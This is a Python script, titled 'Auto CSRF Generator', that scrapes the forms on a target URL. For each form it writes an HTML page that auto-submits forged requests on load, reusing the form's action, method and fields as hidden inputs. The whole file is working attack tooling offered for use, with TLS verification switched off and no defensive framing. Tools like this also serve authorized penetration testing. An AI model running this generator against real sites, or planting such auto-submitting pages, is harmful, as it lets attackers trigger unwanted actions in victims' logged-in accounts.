import requests
from bs4 import BeautifulSoup
import argparse

def fetch_forms(url):
    try:
        res = requests.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(res.text, 'html.parser')
        forms = soup.find_all("form")
        print(f"[+] Found {len(forms)} form(s) on {url}")
        return forms
    except Exception as e:
        print(f"[!] Failed to fetch forms: {e}")
        return []

def build_csrf_poc(form, base_url):
    action = form.get("action") or base_url
    method = form.get("method", "GET").upper()
    inputs = form.find_all("input")
    
    poc = f"""
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="{action}" method="{method}">
    """

    for i in inputs:
        name = i.get("name")
        value = i.get("value", "")
        if name:
            poc += f'<input type="hidden" name="{name}" value="{value}">\n'

    poc += """
    </form>
  </body>
</html>
"""
    return poc

def save_poc(poc_html, form_index):
    filename = f"csrf_poc_{form_index}.html"
    with open(filename, "w") as f:
        f.write(poc_html)
    print(f"[💾] PoC saved as {filename}")

def main(url):
    forms = fetch_forms(url)
    if not forms:
        return
    for idx, form in enumerate(forms):
        poc = build_csrf_poc(form, url)
        save_poc(poc, idx)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="💣 Auto CSRF Generator")
    parser.add_argument("url", help="Target URL with form")
    args = parser.parse_args()
    main(args.url)
